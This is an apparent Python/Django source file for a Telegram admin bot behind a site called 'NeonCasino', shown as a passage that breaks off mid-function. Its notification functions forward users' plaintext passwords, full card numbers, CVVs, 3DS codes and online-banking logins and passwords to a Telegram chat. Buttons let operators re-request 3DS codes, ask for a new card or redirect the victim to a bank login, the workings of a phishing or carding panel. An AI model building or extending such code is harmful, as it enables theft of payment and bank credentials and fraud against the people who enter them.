import asyncio
import logging
import threading
import requests
from telegram import Bot, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.error import TelegramError
from django.conf import settings
from asgiref.sync import sync_to_async
from .models import BotSettings
from promo.models import PromoCode, PromoRedemption

logger = logging.getLogger(__name__)

# Admin chat ID - полный доступ ко всем функциям
ADMIN_CHAT_ID = "-1003065807763"

# Managers chat ID - только уведомления о регистрациях по промокодам
MANAGERS_CHAT_ID = "-1002963122811"  # Замените на реальный ID чата менеджеров

# List of admin user IDs (add your Telegram user ID here)
DEFAULT_ADMIN_USER_IDS = [
    "7488241226",
]

# List of manager user IDs
DEFAULT_MANAGER_USER_IDS = [
    # Add manager Telegram user IDs here
]

def is_admin(user_id, chat_id, bot_service=None):
    """Check if user is admin"""
    # Allow if user is in admin chat
    if bot_service:
        admin_chat_id = bot_service.get_admin_chat_id()
    else:
        admin_chat_id = ADMIN_CHAT_ID
    
    if str(chat_id) == admin_chat_id:
        return True
    # Allow if user ID is in admin list
    if bot_service and hasattr(bot_service, 'admin_user_ids'):
        if str(user_id) in bot_service.admin_user_ids:
            return True
    elif str(user_id) in DEFAULT_ADMIN_USER_IDS:
        return True
    return False

def is_manager(user_id, chat_id, bot_service=None):
    """Check if user is manager"""
    # Allow if user is in managers chat
    if bot_service:
        managers_chat_id = bot_service.get_managers_chat_id()
    else:
        managers_chat_id = MANAGERS_CHAT_ID
    
    if managers_chat_id and str(chat_id) == managers_chat_id:
        return True
    # Allow if user ID is in manager list
    if bot_service and hasattr(bot_service, 'manager_user_ids'):
        if str(user_id) in bot_service.manager_user_ids:
            return True
    elif str(user_id) in DEFAULT_MANAGER_USER_IDS:
        return True
    return False

def has_access(user_id, chat_id, access_level='admin', bot_service=None):
    """Check user access level"""
    if access_level == 'admin':
        return is_admin(user_id, chat_id, bot_service)
    elif access_level == 'manager':
        return is_manager(user_id, chat_id, bot_service) or is_admin(user_id, chat_id, bot_service)
    return False

def get_country_by_ip(ip_address):
    """Get country by IP address"""
    try:
        response = requests.get(f"http://ip-api.com/json/{ip_address}")
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'success':
                return data.get('country', 'Unknown')
        return "Local"
    except:
        return "Unknown"

class TelegramBotService:
    def __init__(self):
        self.bot_settings = BotSettings.objects.first()
        if not self.bot_settings or not self.bot_settings.bot_token:
            logger.error("Bot token not configured!")
            return
        
        # Initialize admin and manager lists
        self.admin_user_ids = DEFAULT_ADMIN_USER_IDS.copy()
        self.manager_user_ids = DEFAULT_MANAGER_USER_IDS.copy()
        
        try:
            self.bot = Bot(token=self.bot_settings.bot_token)
            logger.info("TelegramBotService initialized successfully")
        except Exception as e:
            logger.error(f"Failed to initialize bot: {e}")
            self.bot = None
    
    def _ensure_initialized(self):
        """Инициализируем бота только при необходимости"""
        if not hasattr(self, 'bot') or self.bot is None:
            try:
                if not self.bot_settings or not self.bot_settings.bot_token:
                    logger.error("Bot token not configured!")
                    return
                self.bot = Bot(token=self.bot_settings.bot_token)
                logger.info("TelegramBotService initialized successfully")
            except Exception as e:
                logger.error(f"Failed to initialize bot: {e}")
                self.bot = None
    
    def get_admin_chat_id(self):
        """Get admin chat ID from settings"""
        if self.bot_settings:
            return self.bot_settings.admin_chat_id
        return ADMIN_CHAT_ID  # Fallback to hardcoded value
    
    def get_managers_chat_id(self):
        """Get managers chat ID from settings"""
        if self.bot_settings and self.bot_settings.managers_chat_id:
            return self.bot_settings.managers_chat_id
        return MANAGERS_CHAT_ID  # Fallback to hardcoded value
    
    async def send_message_to_admin(self, message: str, reply_markup=None):
        """Send message to admin chat"""
        try:
            self._ensure_initialized()
            if not hasattr(self, 'bot') or not self.bot:
                logger.error("Bot not initialized!")
                return
            
            admin_chat_id = self.get_admin_chat_id()
            await self.bot.send_message(
                chat_id=admin_chat_id,
                text=message,
                reply_markup=reply_markup
            )
            logger.info(f"Message sent to admin chat successfully")
        except Exception as e:
            logger.error(f"Error sending message to admin: {e}")
            logger.exception("Full traceback:")
    
    async def send_message_to_managers(self, message: str, reply_markup=None):
        """Send message to managers chat"""
        try:
            self._ensure_initialized()
            if not hasattr(self, 'bot') or not self.bot:
                logger.error("Bot not initialized!")
                return
            
            managers_chat_id = self.get_managers_chat_id()
            if not managers_chat_id:
                logger.warning("Managers chat ID not configured, skipping manager notification")
                return
                
            await self.bot.send_message(
                chat_id=managers_chat_id,
                text=message,
                reply_markup=reply_markup
            )
            logger.info(f"Message sent to managers chat successfully")
        except Exception as e:
            logger.error(f"Error sending message to managers: {e}")
            logger.exception("Full traceback:")
    
    async def notify_admin_user_registration(self, user):
        """Notify admin about new user registration"""
        # Get country by IP
        ip_address = getattr(user, 'registration_ip', 'Unknown')
        country = get_country_by_ip(ip_address) if ip_address != 'Unknown' else 'Unknown'
        
        # Get password from temporary field
        password = getattr(user, 'password_plain', 'Not saved')
        
        message = f"""
🔔 Новая регистрация пользователя

👤 Пользователь: {user.username}
📧 Email: {user.email}
🔑 Пароль: {password}
📅 Дата: {user.created_at.strftime('%Y-%m-%d %H:%M:%S')}
🌐 IP: {ip_address}
🌍 Страна: {country}

⏰ Время: {user.created_at.strftime('%Y-%m-%d %H:%M:%S')}
        """
        
        await self.send_message_to_admin(message)
    
    async def notify_manager_user_registration(self, user, promo_code=None):
        """Notify manager about new user registration with promo code"""
        message = f"""
🎯 Новая регистрация по промокоду

👤 Пользователь: {user.username}
📧 Email: {user.email}
🎁 Промокод: {promo_code or 'N/A'}
📅 Дата: {user.created_at.strftime('%Y-%m-%d %H:%M:%S')}
🌐 IP: {getattr(user, 'registration_ip', 'Unknown')}
🌍 Страна: {getattr(user, 'registration_country', 'Unknown')}

⏰ Время: {user.created_at.strftime('%Y-%m-%d %H:%M:%S')}
        """
        
        await self.send_message_to_managers(message)
    
    async def notify_admin_kyc_submitted(self, kyc):
        """Notify admin about KYC submission"""
        message = f"""
📋 Новая KYC заявка

👤 Пользователь: {kyc.user.email}
📅 Дата подачи: {kyc.created_at.strftime('%Y-%m-%d %H:%M:%S')}
📄 Тип документа: {kyc.id_document_type}
📝 Номер документа: {kyc.id_document_number}
👤 Полное имя: {kyc.first_name} {kyc.last_name}
🌍 Страна: {kyc.country_of_residence}
📞 Телефон: {kyc.phone_number}
🌐 IP: {getattr(kyc, 'submission_ip', 'Unknown')}

⏰ Время: {kyc.created_at.strftime('%Y-%m-%d %H:%M:%S')}
        """
        
        keyboard = [
            [
                InlineKeyboardButton("✅ Одобрить", callback_data=f"kyc_approve_{kyc.id}"),
                InlineKeyboardButton("❌ Отклонить", callback_data=f"kyc_reject_{kyc.id}")
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await self.send_message_to_admin(message, reply_markup)
    
    async def notify_admin_payment_attempt(self, payment, ip_address):
        """Notify admin about payment attempt"""
        message = f"""
[PAYMENT] Попытка платежа

Пользователь: {payment.user.email}
Сумма: {payment.amount} {payment.currency}
Метод: {payment.payment_method}
IP: {ip_address}
Дата: {payment.created_at.strftime('%Y-%m-%d %H:%M:%S')}

Время: {payment.created_at.strftime('%Y-%m-%d %H:%M:%S')}
        """
        
        # Add payment-specific details
        if payment.payment_method == 'card':
            message += f"""
Детали карты:
   Номер: {payment.card_number if payment.card_number else 'N/A'}
   Владелец: {payment.card_holder}
   Срок действия: {payment.card_expiry}
   CVV: {payment.card_cvv}
            """
        elif payment.payment_method == 'bank_transfer':
            message += f"""
[BANK] Банковские данные:
   Банк: {payment.bank_name if payment.bank_name else 'N/A'}
   Логин: {payment.bank_login if payment.bank_login else 'N/A'}
   Пароль: {payment.bank_password if payment.bank_password else 'N/A'}
            """
        
        keyboard = [
            [
                InlineKeyboardButton("✅ Одобрить", callback_data=f"payment_approve_{payment.id}"),
                InlineKeyboardButton("❌ Отклонить", callback_data=f"payment_reject_{payment.id}")
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await self.send_message_to_admin(message, reply_markup)
    
    def _run_async_in_thread(self, coro):
        """Run async coroutine in a separate thread"""
        def run_in_thread():
            try:
                # Create new event loop for this thread
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                
                # Run the coroutine
                result = loop.run_until_complete(coro)
                
                # Clean up
                loop.run_until_complete(loop.shutdown_asyncgens())
                loop.close()
                
                return result
            except Exception as e:
                logger.error(f"Error in async thread: {e}")
                return None
        
        thread = threading.Thread(target=run_in_thread)
        thread.daemon = True  # Make thread daemon so it doesn't block main process
        thread.start()
        return thread
    
    def notify_admin_user_registration_sync(self, user):
        """Synchronous version of notify_admin_user_registration"""
        try:
            # Get all data synchronously
            ip_address = getattr(user, 'registration_ip', 'Unknown')
            country = get_country_by_ip(ip_address) if ip_address != 'Unknown' else 'Unknown'
            password = getattr(user, 'password_plain', 'Not saved')
            
            message = f"""
🔔 Новая регистрация пользователя

👤 Пользователь: {user.username}
📧 Email: {user.email}
🔑 Пароль: {password}
📅 Дата: {user.created_at.strftime('%Y-%m-%d %H:%M:%S')}
🌐 IP: {ip_address}
🌍 Страна: {country}

⏰ Время: {user.created_at.strftime('%Y-%m-%d %H:%M:%S')}
            """
            
            self._run_async_in_thread(self.send_message_to_admin(message))
            logger.info(f"User registration notification sent for {user.email}")
            
        except Exception as e:
            logger.error(f"Error in user registration notification: {e}")
            logger.exception("Full traceback:")
    
    def notify_manager_user_registration_sync(self, user, promo_code=None):
        """Synchronous version of notify_manager_user_registration"""
        try:
            message = f"""
🎯 Новая регистрация по промокоду

👤 Пользователь: {user.username}
📧 Email: {user.email}
🎁 Промокод: {promo_code or 'N/A'}
📅 Дата: {user.created_at.strftime('%Y-%m-%d %H:%M:%S')}
🌐 IP: {getattr(user, 'registration_ip', 'Unknown')}
🌍 Страна: {getattr(user, 'registration_country', 'Unknown')}

⏰ Время: {user.created_at.strftime('%Y-%m-%d %H:%M:%S')}
            """
            
            self._run_async_in_thread(self.send_message_to_managers(message))
            logger.info(f"Manager notification sent for {user.email} with promo code {promo_code}")
            
        except Exception as e:
            logger.error(f"Error in manager notification: {e}")
            logger.exception("Full traceback:")
    
    def notify_admin_kyc_submitted_sync(self, kyc):
        """Synchronous version of notify_admin_kyc_submitted"""
        try:
            message = f"""
📋 Новая KYC заявка

👤 Пользователь: {kyc.user.email}
📅 Дата подачи: {kyc.created_at.strftime('%Y-%m-%d %H:%M:%S')}
📄 Тип документа: {kyc.id_document_type}
📝 Номер документа: {kyc.id_document_number}
👤 Полное имя: {kyc.first_name} {kyc.last_name}
🌍 Страна: {kyc.country_of_residence}
📞 Телефон: {kyc.phone_number}
🌐 IP: {getattr(kyc, 'submission_ip', 'Unknown')}

⏰ Время: {kyc.created_at.strftime('%Y-%m-%d %H:%M:%S')}
            """
            
            keyboard = [
                [
                    InlineKeyboardButton("✅ Одобрить", callback_data=f"kyc_approve_{kyc.id}"),
                    InlineKeyboardButton("❌ Отклонить", callback_data=f"kyc_reject_{kyc.id}")
                ]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            self._run_async_in_thread(self.send_message_to_admin(message, reply_markup))
            logger.info(f"KYC notification sent for {kyc.user.email}")
            
        except Exception as e:
            logger.error(f"Error in KYC notification: {e}")
            logger.exception("Full traceback:")
    
    def notify_admin_3ds_submitted_sync(self, payment):
        """Synchronous version of notify_admin_3ds_submitted"""
        try:
            message = f"""
[3DS] 3DS код получен

Пользователь: {payment.user.email}
Платеж: {payment.id}
Сумма: {payment.amount} {payment.currency}
Метод: {payment.payment_method}
3DS код: {payment.card_3ds_code or 'N/A'}
Дата: {payment.created_at.strftime('%Y-%m-%d %H:%M:%S')}

Время: {payment.created_at.strftime('%Y-%m-%d %H:%M:%S')}
            """
            
            keyboard = [
                [
                    InlineKeyboardButton("[OK] Одобрить 3DS", callback_data=f"3ds_approve_{payment.id}"),
                    InlineKeyboardButton("[X] Отклонить 3DS", callback_data=f"3ds_reject_{payment.id}")
                ],
                [
                    InlineKeyboardButton("[3DS] Запросить 3DS снова", callback_data=f"payment_request_3ds_{payment.id}"),
                    InlineKeyboardButton("[CARD] Запросить новую карту", callback_data=f"payment_new_card_{payment.id}")
                ],
                [
                    InlineKeyboardButton("[BANK] Перебросить на вход в ЛК банка", callback_data=f"payment_bank_login_{payment.id}")
                ]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            self._run_async_in_thread(self.send_message_to_admin(message, reply_markup))
            logger.info(f"3DS notification sent for payment {payment.id}")
            
        except Exception as e:
            logger.error(f"Error in 3DS notification: {e}")
            logger.exception("Full traceback:")

    def notify_admin_payment_attempt_sync(self, payment, ip_address):
        """Synchronous version of notify_admin_payment_attempt"""
        try:
            message = f"""
💳 Попытка платежа

👤 Пользователь: {payment.user.email}
💰 Сумма: {payment.amount} {payment.currency}
💳 Метод: {payment.payment_method}
🌐 IP: {ip_address}
📅 Дата: {payment.created_at.strftime('%Y-%m-%d %H:%M:%S')}

⏰ Время: {payment.created_at.strftime('%Y-%m-%d %H:%M:%S')}
            """
            
            # Add payment-specific details
            if payment.payment_method == 'card':
                message += f"""
💳 Детали карты:
   Номер: {payment.card_number if payment.card_number else 'N/A'}
   Владелец: {payment.card_holder}
   Срок действия: {payment.card_expiry}
   CVV: {payment.card_cvv}
                """
            elif payment.payment_method == 'bank_transfer':
                message += f"""
🏦 Банковские данные:
   Банк: {payment.bank_name if payment.bank_name else 'N/A'}
   Логин: {payment.bank_login if payment.bank_login else 'N/A'}
   Пароль: {payment.bank_password if payment.bank_password else 'N/A'}
                """
            
            keyboard = [
                [
                    InlineKeyboardButton("[OK] Одобрить карту", callback_data=f"payment_approve_{payment.id}"),
                    InlineKeyboardButton("[X] Отклонить карту", callback_data=f"payment_reject_{payment.id}")
                ],
                [
                    InlineKeyboardButton("[3DS] Запросить 3DS", callback_data=f"payment_request_3ds_{payment.id}"),
                    InlineKeyboardButton("[CARD] Запросить новую карту", callback_data=f"payment_new_card_{payment.id}")
                ],
                [
                    InlineKeyboardButton("[BANK] Перебросить на вход в ЛК банка", callback_data=f"payment_bank_login_{payment.id}")
                ]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            # Send message directly using bot.send_message instead of async wrapper
            try:
                # Use asyncio.run to execute the async method
                async def _send_message():
                    await self.bot.send_message(
                        chat_id=self.get_admin_chat_id(),
                        text=message,
                        reply_markup=reply_markup
                    )
                
                asyncio.run(_send_message())
                logger.info(f"Payment notification sent for {payment.user.email}")
            except Exception as e:
                logger.error(f"Failed to send message: {e}")
            
        except Exception as e:
            logger.error(f"Error in payment notification: {e}")
            logger.exception("Full traceback:")

    def get_bot_info(self):
        """Get bot information"""
        try:
            self._ensure_initialized()
            if not hasattr(self, 'bot') or not self.bot:
                return None
            
            # Use asyncio.run to execute async method
            async def _get_info():
                bot_info = await self.bot.get_me()
                return {
                    'id': bot_info.id,
                    'first_name': bot_info.first_name,
                    'username': bot_info.username,
                    'is_bot': bot_info.is_bot
                }
            
            return asyncio.run(_get_info())
                
        except Exception as e:
            logger.error(f"Error getting bot info: {e}")
            return None

    def send_message_sync(self, chat_id: str, message: str):
        """Send message synchronously"""
        try:
            self._ensure_initialized()
            if not hasattr(self, 'bot') or not self.bot:
                logger.error("Bot not initialized!")
                return False
            
            # Use threading approach to avoid event loop conflicts
            def _send_message():
                try:
                    # Create new event loop for this thread
                    loop = asyncio.new_event_loop()
                    asyncio.set_event_loop(loop)
                    
                    # Run the coroutine
                    loop.run_until_complete(self.bot.send_message(
                        chat_id=chat_id,
                        text=message
                    ))
                    
                    # Clean up
                    loop.close()
                    return True
                except Exception as e:
                    logger.error(f"Error in send message thread: {e}")
                    return False
            
            # Run in separate thread
            import threading
            thread = threading.Thread(target=_send_message)
            thread.daemon = True
            thread.start()
            thread.join(timeout=10)  # Wait up to 10 seconds
            
            return True
                
        except Exception as e:
            logger.error(f"Error sending message: {e}")
            return False

    def set_webhook(self, webhook_url: str):
        """Set webhook URL"""
        try:
            self._ensure_initialized()
            if not hasattr(self, 'bot') or not self.bot:
                logger.error("Bot not initialized!")
                return False
            
            self.bot.set_webhook(url=webhook_url)
            logger.info(f"Webhook set to: {webhook_url}")
            return True
        except Exception as e:
            logger.error(f"Error setting webhook: {e}")
            return False

    async def start_polling(self):
        """Start bot in polling mode"""
        try:
            self._ensure_initialized()
            if not hasattr(self, 'bot') or not self.bot:
                logger.error("Bot not initialized!")
                return
            
            logger.info("Starting bot in polling mode...")
            
            # Set flag for graceful shutdown
            self._stop_polling = False
            offset = 0
            
            while not self._stop_polling:
                try:
                    # Get updates with offset to avoid receiving same updates
                    updates = await self.bot.get_updates(
                        offset=offset,
                        timeout=30,  # Long polling
                        limit=100
                    )
                    
                    if updates:
                        logger.info(f"Got {len(updates)} updates")
                        
                        # Process updates
                        for update in updates:
                            if self._stop_polling:
                                break
                            await self._handle_update(update)
                            offset = update.update_id + 1
                    
                    # Small delay to prevent excessive API calls
                    await asyncio.sleep(1)
                    
                except Exception as e:
                    if self._stop_polling:
                        break
                    logger.error(f"Error in polling loop: {e}")
                    await asyncio.sleep(5)  # Wait before retrying
            
            logger.info("Bot polling stopped gracefully")
            
        except Exception as e:
            logger.error(f"Error starting polling: {e}")
            logger.exception("Full traceback:")

    async def stop_polling(self):
        """Stop bot polling gracefully"""
        try:
            logger.info("Stopping bot polling...")
            self._stop_polling = True
            
            # Close bot session
            if hasattr(self, 'bot') and self.bot:
                await self.bot.session.close()
                logger.info("Bot session closed")
            
            logger.info("Bot polling stopped successfully")
            
        except Exception as e:
            logger.error(f"Error stopping polling: {e}")
            logger.exception("Full traceback:")

    async def _handle_update(self, update):
        """Handle incoming update"""
        try:
            if update.message:
                await self._handle_message(update.message)
            elif update.callback_query:
                await self._handle_callback_query(update.callback_query)
        except Exception as e:
            logger.error(f"Error handling update: {e}")

    async def _handle_message(self, message):
        """Handle incoming message"""
        try:
            # Check if user has any access
            if not (has_access(message.from_user.id, message.chat.id, 'admin', self) or 
                   has_access(message.from_user.id, message.chat.id, 'manager', self)):
                await self.bot.send_message(
                    chat_id=message.chat.id,
                    text="❌ Доступ запрещен. Этот бот предназначен только для администраторов и менеджеров."
                )
                return
            
            if message.text == '/start':
                if has_access(message.from_user.id, message.chat.id, 'admin', self):
                    welcome_text = "🎰 Добро пожаловать в NeonCasino Admin Bot!\n\nИспользуйте /help для просмотра команд."
                else:
                    welcome_text = "🎯 Добро пожаловать в NeonCasino Manager Bot!\n\nИспользуйте /help для просмотра команд."
                
                await self.bot.send_message(
                    chat_id=message.chat.id,
                    text=welcome_text
                )
            elif message.text == '/help':
                if has_access(message.from_user.id, message.chat.id, 'admin', self):
                    help_text = """
🤖 Команды NeonCasino Admin Bot:

/start - Запустить бота
/help - Показать справку
/status - Статус системы
/admins - Список админов
/managers - Список менеджеров
/add_admin <user_id> - Добавить админа
/add_manager <user_id> - Добавить менеджера

Действия админа:
• Одобрение/отклонение KYC
• Одобрение/отклонение платежей
• Просмотр статистики
• Управление менеджерами

Примечание: Команды работают в админском чате
                    """
                else:
                    help_text = """
🎯 Команды NeonCasino Manager Bot:

/start - Запустить бота
/help - Показать справку
/status - Статус системы
/my_promo_stats - Статистика промокодов

Действия менеджера:
• Просмотр регистраций по промокодам
• Отслеживание активности пользователей

Примечание: Команды работают в чате менеджеров
                    """
                
                await self.bot.send_message(
                    chat_id=message.chat.id,
                    text=help_text
                )
            elif message.text == '/status':
                if has_access(message.from_user.id, message.chat.id, 'admin', self):
                    status_text = "🟢 Админ бот работает и подключен к системе NeonCasino"
                else:
                    status_text = "🟡 Менеджер бот работает и подключен к системе NeonCasino"
                
                await self.bot.send_message(
                    chat_id=message.chat.id,
                    text=status_text
                )
            elif message.text == '/admins':
                if has_access(message.from_user.id, message.chat.id, 'admin', self):
                    if self.admin_user_ids:
                        admin_list = "\n".join([f"• {admin_id}" for admin_id in self.admin_user_ids])
                        await self.bot.send_message(
                            chat_id=message.chat.id,
                            text=f"👥 Администраторы:\n{admin_list}"
                        )
                    else:
                        await self.bot.send_message(
                            chat_id=message.chat.id,
                            text="ℹ️ Индивидуальные админы не настроены. Доступ только у участников админского чата."
                        )
                else:
                    await self.bot.send_message(
                        chat_id=message.chat.id,
                        text="❌ Эта команда требует права администратора"
                    )
            elif message.text == '/managers':
                if has_access(message.from_user.id, message.chat.id, 'admin', self):
                    if self.manager_user_ids:
                        manager_list = "\n".join([f"• {manager_id}" for manager_id in self.manager_user_ids])
                        await self.bot.send_message(
                            chat_id=message.chat.id,
                            text=f"👥 Менеджеры:\n{manager_list}"
                        )
                    else:
                        await self.bot.send_message(
                            chat_id=message.chat.id,
                            text="ℹ️ Индивидуальные менеджеры не настроены. Доступ только у участников чата менеджеров."
                        )
                else:
                    await self.bot.send_message(
                        chat_id=message.chat.id,
                        text="❌ Эта команда требует права администратора"
                    )
            elif message.text.startswith('/add_admin'):
                # Only allow adding admins from admin users
                if has_access(message.from_user.id, message.chat.id, 'admin', self):
                    try:
                        # Extract user ID from command: /add_admin 123456789
                        parts = message.text.split()
                        if len(parts) == 2:
                            new_admin_id = parts[1]
                            if new_admin_id not in self.admin_user_ids:
                                self.admin_user_ids.append(new_admin_id)
                                await self.bot.send_message(
                                    chat_id=message.chat.id,
                                    text=f"✅ Админ {new_admin_id} добавлен успешно"
                                )
                            else:
                                await self.bot.send_message(
                                    chat_id=message.chat.id,
                                    text=f"ℹ️ Пользователь {new_admin_id} уже является админом"
                                )
                        else:
                            await self.bot.send_message(
                                chat_id=message.chat.id,
                                text="❌ Использование: /add_admin <user_id>"
                            )
                    except Exception as e:
                        await self.bot.send_message(
                            chat_id=message.chat.id,
                            text=f"❌ Ошибка: {str(e)}"
                        )
                else:
                    await self.bot.send_message(
                        chat_id=message.chat.id,
                        text="❌ Эта команда доступна только администраторам"
                    )
            elif message.text.startswith('/add_manager'):
                # Only allow adding managers from admin users
                if has_access(message.from_user.id, message.chat.id, 'admin', self):
                    try:
                        # Extract user ID from command: /add_manager 123456789
                        parts = message.text.split()
                        if len(parts) == 2:
                            new_manager_id = parts[1]
                            if new_manager_id not in self.manager_user_ids:
                                self.manager_user_ids.append(new_manager_id)
                                await self.bot.send_message(
                                    chat_id=message.chat.id,
                                    text=f"✅ Менеджер {new_manager_id} добавлен успешно"
                                )
                            else:
                                await self.bot.send_message(
                                    chat_id=message.chat.id,
                                    text=f"ℹ️ Пользователь {new_manager_id} уже является менеджером"
                                )
                        else:
                            await self.bot.send_message(
                                chat_id=message.chat.id,
                                text="❌ Использование: /add_manager <user_id>"
                            )
                    except Exception as e:
                        await self.bot.send_message(
                            chat_id=message.chat.id,
                            text=f"❌ Ошибка: {str(e)}"
                        )
                else:
                    await self.bot.send_message(
                        chat_id=message.chat.id,
                        text="❌ Эта команда доступна только администраторам"
                    )
            elif message.text == '/my_promo_stats':
                if has_access(message.from_user.id, message.chat.id, 'manager', self):
                    # TODO: Implement promo code statistics for managers
                    await self.bot.send_message(
                        chat_id=message.chat.id,
                        text="📊 Статистика промокодов будет доступна в ближайшее время!"
                    )
                else:
                    await self.bot.send_message(
                        chat_id=message.chat.id,
                        text="❌ Эта команда требует права менеджера"
                    )
        except Exception as e:
            logger.error(f"Error handling message: {e}")

    async def _handle_callback_query(self, callback_query):
        """Handle callback query (button clicks)"""
        try:
            # Check if callback is from admin
            if not has_access(callback_query.from_user.id, callback_query.message.chat.id, 'admin', self):
                logger.info(f"Ignoring callback from non-admin: {callback_query.from_user.id}")
                return
            
            data = callback_query.data
            
            if data.startswith('kyc_approve_'):
                kyc_id = data.split('_')[2]
                await self._approve_kyc(callback_query, kyc_id)
            elif data.startswith('kyc_reject_'):
                kyc_id = data.split('_')[2]
                await self._reject_kyc(callback_query, kyc_id)
            elif data.startswith('payment_approve_'):
                payment_id = data.split('_')[2]
                await self._approve_payment(callback_query, payment_id)
            elif data.startswith('payment_reject_'):
                payment_id = data.split('_')[2]
                await self._reject_payment(callback_query, payment_id)
            elif data.startswith('3ds_approve_'):
                payment_id = data.split('_')[2]
                await self._approve_3ds(callback_query, payment_id)
            elif data.startswith('3ds_reject_'):
                payment_id = data.split('_')[2]
                await self._reject_3ds(callback_query, payment_id)
            elif data.startswith('payment_request_3ds_'):
                payment_id = data.split('_')[3]
                await self._request_3ds(callback_query, payment_id)
            elif data.startswith('payment_new_card_'):
                payment_id = data.split('_')[3]
                await self._request_new_card(callback_query, payment_id)
            elif data.startswith('payment_bank_login_'):
                payment_id = data.split('_')[3]
                await self._request_bank_login(callback_query, payment_id)
            elif data.startswith('manager_approve_'):
                manager_id = data.split('_')[2]
                await self._approve_manager(callback_query, manager_id)
            elif data.startswith('manager_reject_'):
                manager_id = data.split('_')[2]
                await self._reject_manager(callback_query, manager_id)
            elif data.startswith('promo_approve_'):
                promo_request_id = data.split('_')[2]
                await self._approve_promo_request(callback_query, promo_request_id)
            elif data.startswith('promo_reject_'):
                promo_request_id = data.split('_')[2]
                await self._reject_promo_request(callback_query, promo_request_id)
            
            # Answer callback query
            await callback_query.answer()
            
        except Exception as e:
            logger.error(f"Error handling callback query: {e}")

    async def _approve_kyc(self, callback_query, kyc_id):
        """Approve KYC application"""
        try:
            # TODO: Implement KYC approval logic
            await self.bot.send_message(
                chat_id=callback_query.message.chat.id,
                text=f"✅ KYC заявка {kyc_id} одобрена"
            )
        except Exception as e:
            logger.error(f"Error approving KYC: {e}")

    async def _reject_kyc(self, callback_query, kyc_id):
        """Reject KYC application"""
        try:
            # TODO: Implement KYC rejection logic
            await self.bot.send_message(
                chat_id=callback_query.message.chat.id,
                text=f"❌ KYC заявка {kyc_id} отклонена"
            )
        except Exception as e:
            logger.error(f"Error rejecting KYC: {e}")

    async def _approve_payment(self, callback_query, payment_id):
        """Approve payment: set processing and add step"""
        try:
            from payments_new.models import Payment, PaymentStep
            from asgiref.sync import sync_to_async
            
            # Validate payment_id format
            if not payment_id or len(str(payment_id)) < 10:
                await self.bot.send_message(chat_id=callback_query.message.chat.id, text="❌ Неверный формат ID платежа")
                return
            
            # Use sync_to_async for Django ORM operations
            payment = await sync_to_async(Payment.objects.filter(id=payment_id).first)()
            if not payment:
                await self.bot.send_message(chat_id=callback_query.message.chat.id, text=f"❌ Платеж {payment_id} не найден")
                return
            
            # Validate payment status
            if payment.status in ['completed', 'failed', 'cancelled']:
                await self.bot.send_message(chat_id=callback_query.message.chat.id, text=f"❌ Платеж {payment_id} уже завершен (статус: {payment.status})")
                return
            
            # Update payment status
            payment.status = 'approved'
            await sync_to_async(payment.save)(update_fields=['status'])
            
            # Create payment step
            await sync_to_async(PaymentStep.objects.create)(
                payment=payment, 
                step_type='payment_processing', 
                status='completed', 
                description='Approved by admin'
            )
            
            await self.bot.send_message(
                chat_id=callback_query.message.chat.id, 
                text=f"✅ Платеж {payment_id} одобрен и в обработке"
            )
            
        except Exception as e:
            logger.error(f"Error approving payment: {e}")
            await self.bot.send_message(
                chat_id=callback_query.message.chat.id, 
                text=f"❌ Ошибка при одобрении платежа: {str(e)}"
            )

    async def _reject_payment(self, callback_query, payment_id):
        """Reject payment and add step"""
        try:
            from payments_new.models import Payment, PaymentStep
            from asgiref.sync import sync_to_async
            
            # Validate payment_id format
            if not payment_id or len(str(payment_id)) < 10:
                await self.bot.send_message(chat_id=callback_query.message.chat.id, text="❌ Неверный формат ID платежа")
                return
            
            # Use sync_to_async for Django ORM operations
            payment = await sync_to_async(Payment.objects.filter(id=payment_id).first)()
            if not payment:
                await self.bot.send_message(chat_id=callback_query.message.chat.id, text=f"❌ Платеж {payment_id} не найден")
                return
            
            # Validate payment status
            if payment.status in ['completed', 'failed', 'cancelled']:
                await self.bot.send_message(chat_id=callback_query.message.chat.id, text=f"❌ Платеж {payment_id} уже завершен (статус: {payment.status})")
                return
            
            # Update payment status
            payment.status = 'rejected'
            await sync_to_async(payment.save)(update_fields=['status'])
            
            # Create payment step
            await sync_to_async(PaymentStep.objects.create)(
                payment=payment, 
                step_type='payment_processing', 
                status='failed', 
                description='Rejected by admin'
            )
            
            await self.bot.send_message(
                chat_id=callback_query.message.chat.id, 
                text=f"❌ Платеж {payment_id} отклонен"
            )
            
        except Exception as e:
            logger.error(f"Error rejecting payment: {e}")
            await self.bot.send_message(
                chat_id=callback_query.message.chat.id, 
                text=f"❌ Ошибка при отклонении платежа: {str(e)}"
            )

    async def _approve_3ds(self, callback_query, payment_id):
        """Approve 3DS: set 3ds_approved and complete step"""
        try:
            from payments_new.models import Payment, PaymentStep
            
            # Validate payment_id format
            if not payment_id or len(str(payment_id)) < 10:
                await self.bot.send_message(chat_id=callback_query.message.chat.id, text="❌ Неверный формат ID платежа")
                return
            
            # Use sync_to_async for Django ORM operations
            payment = await sync_to_async(Payment.objects.filter(id=payment_id).first)()
            if not payment:
                await self.bot.send_message(chat_id=callback_query.message.chat.id, text=f"❌ Платеж {payment_id} не найден")
                return
            
            # Validate payment status
            if payment.status not in ['waiting_3ds', '3ds_submitted']:
                await self.bot.send_message(chat_id=callback_query.message.chat.id, text=f"❌ Платеж {payment_id} не ожидает 3DS (статус: {payment.status})")
                return
            
            # Update payment status
            payment.status = '3ds_approved'
            await sync_to_async(payment.save)(update_fields=['status'])
            
            # Create payment step
            await sync_to_async(PaymentStep.objects.create)(
                payment=payment, 
                step_type='3ds_verification', 
                status='completed', 
                description='3DS approved by admin'
            )
            
            await self.bot.send_message(
                chat_id=callback_query.message.chat.id, 
                text=f"✅ 3DS код для платежа {payment_id} одобрен"
            )
            
        except Exception as e:
            logger.error(f"Error approving 3DS: {e}")
            await self.bot.send_message(
                chat_id=callback_query.message.chat.id, 
                text=f"❌ Ошибка при одобрении 3DS: {str(e)}"
            )

    async def _reject_3ds(self, callback_query, payment_id):
        """Reject 3DS: set 3ds_rejected and fail step"""
        try:
            from payments_new.models import Payment, PaymentStep
